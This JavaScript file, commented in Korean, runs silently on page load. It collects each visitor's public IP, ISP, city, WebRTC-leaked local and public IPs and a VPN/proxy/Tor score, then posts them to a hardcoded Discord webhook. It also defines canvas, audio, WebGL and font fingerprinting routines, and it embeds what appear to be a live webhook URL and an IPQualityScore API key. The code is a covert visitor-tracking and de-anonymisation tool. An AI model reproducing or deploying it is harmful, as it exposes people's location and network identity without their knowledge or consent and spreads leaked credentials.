/*****************************
 * CONFIG
 *****************************/
const WEBHOOK_URL = "https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx";
const IPQS_KEY = "n0hXiA0tP5MMGuctT84vLRAdCfTdUvrE";

/*****************************
 * 기본 환경 및 디바이스 정보 함수
 *****************************/
function getDeviceInfo() {
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages?.join(", ") ?? "N/A",
        cpuCores: navigator.hardwareConcurrency ?? "N/A",
        touchPoints: navigator.maxTouchPoints ?? 0,
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? "온라인" : "오프라인",
        doNotTrack: navigator.doNotTrack ?? "N/A"
    };
}

function getScreenInfo() {
    return {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation?.type ?? "N/A"
    };
}

function getNetworkInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c
        ? {
              effectiveType: c.effectiveType ?? "N/A",
              downlink: c.downlink ? `${c.downlink} Mbps` : "N/A",
              rtt: c.rtt ? `${c.rtt}ms` : "N/A",
              saveData: c.saveData ? "활성화" : "비활성화"
          }
        : {
              effectiveType: "N/A",
              downlink: "N/A",
              rtt: "N/A",
              saveData: "N/A"
          };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let name = "Unknown",
        ver = "Unknown";

    if (ua.includes("Chrome") && !ua.includes("Edg")) {
        name = "Chrome";
        ver = ua.match(/Chrome\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Firefox")) {
        name = "Firefox";
        ver = ua.match(/Firefox\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        name = "Safari";
        ver = ua.match(/Version\/([\d.]+)/)?.[1] ?? "Unknown";
    } else if (ua.includes("Edg")) {
        name = "Edge";
        ver = ua.match(/Edg\/([\d.]+)/)?.[1] ?? "Unknown";
    }

    return { browserName: name, browserVersion: ver };
}

function getOSInfo() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
    if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
    if (ua.includes("Windows NT 6.2")) return "Windows 8";
    if (ua.includes("Windows NT 6.1")) return "Windows 7";
    if (ua.includes("Mac OS X")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "Unknown";
}

async function getBatteryInfo() {
    try {
        if ("getBattery" in navigator) {
            const b = await navigator.getBattery();
            return {
                level: Math.round(b.level * 100) + "%",
                charging: b.charging ? "충전 중" : "충전 안 함",
                chargingTime: b.chargingTime === Infinity ? "N/A" : `${Math.round(b.chargingTime / 60)}분`,
                dischargingTime: b.dischargingTime === Infinity ? "N/A" : `${Math.round(b.dischargingTime / 60)}분`
            };
        }
    } catch {}
    return { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
}

function getMemoryInfo() {
    try {
        const m = performance.memory;
        return {
            usedJSHeapSize: `${(m.usedJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
            totalJSHeapSize: `${(m.totalJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
            jsHeapSizeLimit: `${(m.jsHeapSizeLimit / 1024 / 1024).toFixed(1)} MB`
        };
    } catch {
        return { usedJSHeapSize: "N/A", totalJSHeapSize: "N/A", jsHeapSizeLimit: "N/A" };
    }
}

function getPluginsInfo() {
    try {
        return [...navigator.plugins].map(p => p.name).join(", ") || "N/A";
    } catch {
        return "N/A";
    }
}

function getWebGLInfo() {
    try {
        const c = document.createElement("canvas");
        const gl = c.getContext("webgl");
        if (!gl) return { vendor: "N/A", renderer: "N/A" };

        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
            unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A"
        };
    } catch {
        return { vendor: "N/A", renderer: "N/A" };
    }
}

function getCanvasFingerprint() {
    try {
        const c = document.createElement("canvas");
        const ctx = c.getContext("2d");
        ctx.font = "16px Arial";
        ctx.fillText("Fingerprint", 2, 2);
        return c.toDataURL().slice(-40);
    } catch {
        return "N/A";
    }
}

function getAudioFingerprint() {
    try {
        const a = new AudioContext();
        const osc = a.createOscillator();
        const analyser = a.createAnalyser();
        osc.connect(analyser);
        analyser.connect(a.destination);
        osc.start();
        const arr = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(arr);
        a.close();
        return arr.slice(0, 8).join(",");
    } catch {
        return "N/A";
    }
}

function getFontsInfo() {
    const fonts = ["Arial", "Helvetica", "Times New Roman", "Verdana", "Courier New", "Georgia"];
    const base = document.createElement("canvas");
    const ctx = base.getContext("2d");
    ctx.font = "40px monospace";
    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;

    return fonts.filter(f => {
        ctx.font = `40px ${f}, monospace`;
        return ctx.measureText("mmmmmmmmmmlli").width !== baseWidth;
    }).join(", ");
}

function getTimezoneInfo() {
    return {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
        offset: new Date().getTimezoneOffset()
    };
}

/*****************************
 * WebRTC + NAT + VPN 탐지
 *****************************/
function detectNATType(candidates) {
    if (!candidates.length) return "Unknown";
    if (candidates.some(c => c.includes("relay"))) return "Symmetric NAT (VPN 가능성 매우 높음)";
    if (candidates.some(c => c.includes("srflx"))) return "Restricted NAT";
    return "Full Cone / Unknown";
}

async function getWebRTCInfo() {
    return new Promise(resolve => {
        const result = { localIPs: [], publicIPs: [], blocked: false, vpnLikely: "Unknown", natType: "Unknown" };
        let done = false;

        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" }
            ]
        });

        pc.createDataChannel("x");

        const candidates = [];

        pc.onicecandidate = e => {
            if (!e.candidate) return;

            const c = e.candidate.candidate;
            candidates.push(c);

            const ip = c.match(/\d+\.\d+\.\d+\.\d+/)?.[0];
            if (!ip) return;

            if (c.includes("host") && !result.localIPs.includes(ip)) result.localIPs.push(ip);
            if ((c.includes("srflx") || c.includes("relay")) && !result.publicIPs.includes(ip))
                result.publicIPs.push(ip);
        };

        pc.createOffer()
            .then(o => pc.setLocalDescription(o))
            .catch(() => { result.blocked = true; done = true; resolve(result); });

        setTimeout(() => {
            if (done) return;
            done = true;

            result.natType = detectNATType(candidates);

            if (window._realIP && result.publicIPs.length) {
                result.vpnLikely = result.publicIPs.includes(window._realIP) ? "No" : "Yes";
            }

            resolve(result);
        }, 3000);
    });
}

/*****************************
 * IPQualityScore (핵심)
 *****************************/
async function fetchIPQualityScore(ip) {
    try {
        const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_KEY}/${ip}`);
        return await res.json();
    } catch {
        return null;
    }
}

/*****************************
 * VPN Score 계산
 *****************************/
function calculateVPNScore(info) {
    let s = 0;

    // IPQS 비중 가장 큼
    if (info.ipqs.vpn) s += 50;
    if (info.ipqs.proxy) s += 30;
    if (info.ipqs.tor) s += 70;
    if (info.ipqs.recent_abuse) s += 15;
    s += Math.min(30, Math.round((info.ipqs.fraud_score || 0) / 3));

    // WebRTC 비교
    if (info.webrtc.vpnLikely === "Yes") s += 20;
    if (info.webrtc.natType.includes("Symmetric")) s += 10;

    return Math.min(100, s);
}

/*****************************
 * 메인 실행
 *****************************/
async function collectAndSend() {
    try {
        // Real IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();
        window._realIP = ip;

        // 위치
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();

        // IPQualityScore
        const ipqs = await fetchIPQualityScore(ip);

        // WebRTC
        const webrtc = await getWebRTCInfo();

        const vpnScore = calculateVPNScore({ ipqs, webrtc });
        const conclusion =
            vpnScore >= 80 ? "VPN/프록시 사용 매우 강하게 의심"
            : vpnScore >= 50 ? "VPN/프록시 가능성 있음"
            : "VPN 가능성 낮음";

        /***********************
         * Discord Embed 생성
         ***********************/
        const embed = {
            title: "새로운 방문자 정보 (IP 분석 + IPQualityScore)",
            color: 0x5865F2,
            fields: [
                {
                    name: "기본 정보",
                    value:
                        `IP: ${ip}\n` +
                        `ISP: ${loc.isp}\n` +
                        `국가/도시: ${loc.country} / ${loc.city}`,
                    inline: false
                },
                {
                    name: "IPQualityScore 분석",
                    value:
                        `VPN: ${ipqs.vpn}\n` +
                        `Proxy: ${ipqs.proxy}\n` +
                        `TOR: ${ipqs.tor}\n` +
                        `Fraud Score: ${ipqs.fraud_score}\n` +
                        `최근 악용 기록: ${ipqs.recent_abuse}`,
                    inline: false
                },
                {
                    name: "WebRTC 분석",
                    value:
                        `차단 여부: ${webrtc.blocked}\n` +
                        `Local IP: ${webrtc.localIPs.join(", ") || "N/A"}\n` +
                        `Candidate IP: ${webrtc.publicIPs.join(", ") || "N/A"}\n` +
                        `NAT 타입: ${webrtc.natType}\n` +
                        `WebRTC 기반 VPN 추정: ${webrtc.vpnLikely}`,
                    inline: false
                },
                {
                    name: "최종 판단",
                    value:
                        `VPN 점수: ${vpnScore} / 100\n` +
                        `판정: **${conclusion}**`,
                    inline: false
                }
            ],
            footer: { text: "자동 수집 시스템" }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.log("오류 발생:", err);
    }
}

window.addEventListener("load", collectAndSend);
